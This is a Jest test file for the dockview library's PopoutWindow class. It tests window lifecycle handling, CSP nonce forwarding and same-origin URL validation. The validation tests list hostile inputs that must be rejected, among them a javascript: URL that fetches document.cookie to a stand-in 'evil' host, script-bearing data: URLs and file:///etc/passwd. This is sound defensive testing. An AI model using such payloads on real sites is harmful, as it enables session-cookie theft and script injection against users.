import {
    PopoutWindow,
    assertSameOriginPopoutUrl,
    getPopoutUrlError,
} from '../popoutWindow';

describe('PopoutWindow', () => {
    function makeFakeExternalWindow() {
        const externalDoc =
            document.implementation.createHTMLDocument('popout');
        const listeners: Record<string, EventListener[]> = {};

        let closed = false;

        const externalWindow: any = {
            document: externalDoc,
            get closed() {
                return closed;
            },
            close: jest.fn(() => {
                closed = true;
            }),
            addEventListener: (type: string, fn: EventListener) => {
                (listeners[type] ||= []).push(fn);
            },
            removeEventListener: jest.fn(),
            dispatchEvent: (event: Event) => {
                for (const fn of listeners[event.type] ?? []) {
                    fn(event);
                }
                return true;
            },
        };

        /**
         * The window goes away without its document running unload handlers -
         * a native shell destroying the webview, or a browser discarding the
         * page. All the opener is left with is `closed`.
         */
        const simulateSilentClose = () => {
            closed = true;
        };

        const fireLoad = () => {
            for (const fn of listeners['load'] ?? []) {
                fn(new Event('load'));
            }
        };

        const fireUnload = () => {
            for (const fn of listeners['unload'] ?? []) {
                fn(new Event('unload'));
            }
        };

        return {
            externalWindow,
            externalDoc,
            fireLoad,
            fireUnload,
            simulateSilentClose,
        };
    }

    /**
     * `open()` resolves a container on the popout's `load` event, which a
     * window dismissed mid-load never fires. It must still settle: a caller
     * that awaits the open - `addPopoutGroup` holds its layout transaction
     * open until it resolves - would otherwise wait forever.
     */
    describe('open() always settles', () => {
        function openWindow(externalWindow: unknown) {
            const openSpy = jest
                .spyOn(window, 'open')
                .mockReturnValue(externalWindow as Window);

            const popout = new PopoutWindow('target-id', 'dv-test-class', {
                url: '/popout.html',
                top: 0,
                left: 0,
                width: 100,
                height: 100,
            });

            return { popout, openSpy };
        }

        /**
         * A popout window fires `unload` on its initial `about:blank` document
         * as it navigates to the configured url, *before* `load`. Measured in
         * Chromium: opening `/popout.html` and listening on the returned window
         * gives `["unload", "load"]` for a completely healthy popout. Treating
         * `unload` as "the window went away" would therefore send every popout
         * down the blocked-popup fallback.
         */
        test('an unload before load does not settle the open', async () => {
            const { externalWindow, fireLoad, fireUnload } =
                makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();

                let settled = false;
                void opened.then(() => {
                    settled = true;
                });

                fireUnload();
                await Promise.resolve();
                expect(settled).toBe(false);

                fireLoad();

                await expect(opened).resolves.not.toBeNull();
            } finally {
                openSpy.mockRestore();
                popout.dispose();
            }
        });

        test('resolves null when the window is closed before it loads', async () => {
            const { externalWindow } = makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                popout.close();

                await expect(opened).resolves.toBeNull();
            } finally {
                openSpy.mockRestore();
                popout.dispose();
            }
        });

        /**
         * `beforeunload` on the popout document is the only signal dockview gets
         * that its window went away - and it is not guaranteed. A native shell
         * tearing the webview down, or a browser discarding the page, skips the
         * page's unload handlers entirely, which would leave the group
         * registered against a window that no longer exists.
         */
        test('notices a window that closed without unloading', async () => {
            jest.useFakeTimers();
            const { externalWindow, fireLoad, simulateSilentClose } =
                makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                fireLoad();
                await opened;
                expect(popout.window).toBe(externalWindow);

                const closes: number[] = [];
                popout.onDidClose(() => closes.push(1));

                simulateSilentClose();
                expect(closes).toHaveLength(0);

                jest.advanceTimersByTime(1000);

                expect(closes).toHaveLength(1);
                expect(popout.window).toBeNull();
            } finally {
                openSpy.mockRestore();
                popout.dispose();
                jest.useRealTimers();
            }
        });

        test('stops polling for a close once the popout is closed', async () => {
            jest.useFakeTimers();
            const { externalWindow, fireLoad } = makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                fireLoad();
                await opened;

                popout.close();

                const closes: number[] = [];
                popout.onDidClose(() => closes.push(1));

                // `close()` above already set the window's `closed` flag; a
                // poller left running would fire close again on every tick.
                jest.advanceTimersByTime(5000);

                expect(closes).toHaveLength(0);
            } finally {
                openSpy.mockRestore();
                popout.dispose();
                jest.useRealTimers();
            }
        });

        /**
         * A window the opener cannot script is no more usable than one that
         * never opened, because a popout is populated by moving DOM into its
         * document. Some hosts answer `window.open` with a window in a separate
         * JavaScript context; touching it then throws. That has to settle the
         * open as a blocked window rather than reject, so the caller's fallback
         * returns the group to the grid instead of losing it to a window left
         * standing on screen.
         */
        test('an unscriptable window settles as a blocked one', async () => {
            const { externalWindow } = makeFakeExternalWindow();
            const warn = jest.spyOn(console, 'warn').mockImplementation();
            externalWindow.addEventListener = () => {
                throw new DOMException('blocked a frame', 'SecurityError');
            };

            const { popout, openSpy } = openWindow(externalWindow);

            try {
                await expect(popout.open()).resolves.toBeNull();
                expect(externalWindow.close).toHaveBeenCalled();
                expect(popout.window).toBeNull();
            } finally {
                openSpy.mockRestore();
                warn.mockRestore();
                popout.dispose();
            }
        });

        test('a document that cannot be reached after load settles as blocked', async () => {
            const { externalWindow, fireLoad } = makeFakeExternalWindow();
            const warn = jest.spyOn(console, 'warn').mockImplementation();
            Object.defineProperty(externalWindow, 'document', {
                get() {
                    throw new DOMException('blocked a frame', 'SecurityError');
                },
            });

            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                fireLoad();

                await expect(opened).resolves.toBeNull();
                expect(externalWindow.close).toHaveBeenCalled();
            } finally {
                openSpy.mockRestore();
                warn.mockRestore();
                popout.dispose();
            }
        });

        /**
         * `close()` closes the window, and a host may answer that by running
         * the document's unload handlers there and then - which re-enters
         * `close()` through the `beforeunload` listener dockview registered on
         * the popout. One close is one close, however it arrives.
         */
        test('a host that unloads the document inside close() still closes once', async () => {
            const { externalWindow, fireLoad } = makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                fireLoad();
                await opened;

                const willClose: number[] = [];
                const didClose: number[] = [];
                popout.onWillClose(() => willClose.push(1));
                popout.onDidClose(() => didClose.push(1));

                // the host runs the document's unload handlers as part of
                // closing the window, which reaches the `beforeunload` listener
                // dockview registered on the popout
                externalWindow.close.mockImplementation(() => {
                    externalWindow.dispatchEvent(new Event('beforeunload'));
                });

                popout.close();

                expect(willClose).toHaveLength(1);
                expect(didClose).toHaveLength(1);
            } finally {
                openSpy.mockRestore();
                popout.dispose();
            }
        });

        test('a load that arrives first still wins over a later close', async () => {
            const { externalWindow, fireLoad } = makeFakeExternalWindow();
            const { popout, openSpy } = openWindow(externalWindow);

            try {
                const opened = popout.open();
                fireLoad();
                popout.close();

                await expect(opened).resolves.not.toBeNull();
            } finally {
                openSpy.mockRestore();
                popout.dispose();
            }
        });
    });

    function withParentStyleSheet<T>(cssText: string, fn: () => T): T {
        const styleEl = document.createElement('style');
        styleEl.appendChild(document.createTextNode(cssText));
        document.head.appendChild(styleEl);
        try {
            return fn();
        } finally {
            styleEl.remove();
        }
    }

    test('forwards nonce from options through addStyles into the popout document', async () => {
        const { externalWindow, externalDoc, fireLoad } =
            makeFakeExternalWindow();
        const openSpy = jest
            .spyOn(window, 'open')
            .mockReturnValue(externalWindow as Window);

        try {
            await withParentStyleSheet('.dv { color: red; }', async () => {
                const popout = new PopoutWindow('target-id', 'dv-test-class', {
                    url: '/popout.html',
                    top: 0,
                    left: 0,
                    width: 100,
                    height: 100,
                    nonce: 'popout-nonce-123',
                });

                const opened = popout.open();
                fireLoad();
                await opened;

                const styles = externalDoc.head.querySelectorAll('style');
                expect(styles.length).toBeGreaterThan(0);
                styles.forEach((s) => {
                    expect(s.getAttribute('nonce')).toBe('popout-nonce-123');
                });

                popout.dispose();
            });
        } finally {
            openSpy.mockRestore();
        }
    });

    test('resolves nonce function against the popout document', async () => {
        const { externalWindow, externalDoc, fireLoad } =
            makeFakeExternalWindow();
        const meta = externalDoc.createElement('meta');
        meta.setAttribute('name', 'csp-nonce');
        meta.setAttribute('content', 'from-popout-meta');
        externalDoc.head.appendChild(meta);

        const openSpy = jest
            .spyOn(window, 'open')
            .mockReturnValue(externalWindow as Window);

        try {
            await withParentStyleSheet('.dv { color: red; }', async () => {
                const nonceFn = jest.fn(
                    (doc: Document) =>
                        doc
                            .querySelector<HTMLMetaElement>(
                                'meta[name="csp-nonce"]'
                            )
                            ?.getAttribute('content') ?? undefined
                );

                const popout = new PopoutWindow('target-id', 'dv-test-class', {
                    url: '/popout.html',
                    top: 0,
                    left: 0,
                    width: 100,
                    height: 100,
                    nonce: nonceFn,
                });

                const opened = popout.open();
                fireLoad();
                await opened;

                expect(nonceFn).toHaveBeenCalledWith(externalDoc);
                const styles = externalDoc.head.querySelectorAll('style');
                expect(styles.length).toBeGreaterThan(0);
                styles.forEach((s) => {
                    expect(s.getAttribute('nonce')).toBe('from-popout-meta');
                });

                popout.dispose();
            });
        } finally {
            openSpy.mockRestore();
        }
    });

    test('does not set a nonce attribute when no nonce option is supplied', async () => {
        const { externalWindow, externalDoc, fireLoad } =
            makeFakeExternalWindow();
        const openSpy = jest
            .spyOn(window, 'open')
            .mockReturnValue(externalWindow as Window);

        try {
            await withParentStyleSheet('.dv { color: red; }', async () => {
                const popout = new PopoutWindow('target-id', 'dv-test-class', {
                    url: '/popout.html',
                    top: 0,
                    left: 0,
                    width: 100,
                    height: 100,
                });

                const opened = popout.open();
                fireLoad();
                await opened;

                const styles = externalDoc.head.querySelectorAll('style');
                expect(styles.length).toBeGreaterThan(0);
                styles.forEach((s) => {
                    expect(s.hasAttribute('nonce')).toBe(false);
                });

                popout.dispose();
            });
        } finally {
            openSpy.mockRestore();
        }
    });
});

describe('assertSameOriginPopoutUrl', () => {
    // jsdom defaults window.location.href to 'http://localhost/'

    describe('accepts same-origin URLs', () => {
        test.each([
            '/popout.html',
            './popout.html',
            'popout.html',
            '/path/to/popout.html?a=1#fragment',
            'http://localhost/popout.html',
            'http://localhost/',
        ])('accepts %s', (url) => {
            expect(() => assertSameOriginPopoutUrl(url)).not.toThrow();
        });
    });

    describe('rejects unsafe URLs', () => {
        test.each([
            // The main case: a javascript: URL would execute in a context the
            // browser still associates with the opener.
            ['javascript:alert(1)'],
            ["javascript:fetch('https://evil/?c='+document.cookie)"],
            // Data and blob URLs can carry arbitrary HTML/JS.
            ['data:text/html,<script>alert(1)</script>'],
            ['blob:http://localhost/abc-123'],
            // Legacy script protocol.
            ['vbscript:msgbox(1)'],
            // Cross-origin: different host, different port, different scheme.
            ['https://evil.com/popout.html'],
            ['http://attacker.example/popout.html'],
            ['http://localhost:8080/popout.html'],
            ['https://localhost/popout.html'],
            // file: protocol.
            ['file:///etc/passwd'],
        ])('rejects %s', (url) => {
            expect(() => assertSameOriginPopoutUrl(url)).toThrow(
                /dockview: popout URL/
            );
        });
    });
});

describe('getPopoutUrlError on a custom app scheme', () => {
    // A packaged desktop webview serves the app from its own scheme (Tauri on
    // macOS and Linux: `tauri://localhost`). The URL spec gives such schemes
    // an opaque origin, so `origin` comparison cannot tell same-app from
    // cross-app; scheme + host can.
    const page = {
        href: 'tauri://localhost/index.html',
        protocol: 'tauri:',
        host: 'localhost',
    };

    test.each([
        '/popout.html',
        'popout.html',
        'tauri://localhost/popout.html',
        'tauri://localhost/nested/popout.html?x=1#y',
    ])('accepts %s', (url) => {
        expect(getPopoutUrlError(url, page)).toBeUndefined();
    });

    test.each([
        // a different app, or a different scheme, is another origin
        ['tauri://other-app/popout.html'],
        ['http://localhost/popout.html'],
        ['https://localhost/popout.html'],
        // the unsafe schemes stay refused whatever the page's scheme is
        ['javascript:alert(1)'],
        ['data:text/html,<script>alert(1)</script>'],
        ['blob:tauri://localhost/abc-123'],
        ['vbscript:msgbox(1)'],
        ['file:///etc/passwd'],
    ])('rejects %s', (url) => {
        expect(getPopoutUrlError(url, page)).toBeInstanceOf(Error);
    });

    test('a file: page still cannot pop out file: URLs', () => {
        const filePage = {
            href: 'file:///app/index.html',
            protocol: 'file:',
            host: '',
        };
        expect(getPopoutUrlError('/popout.html', filePage)).toBeInstanceOf(
            Error
        );
    });
});
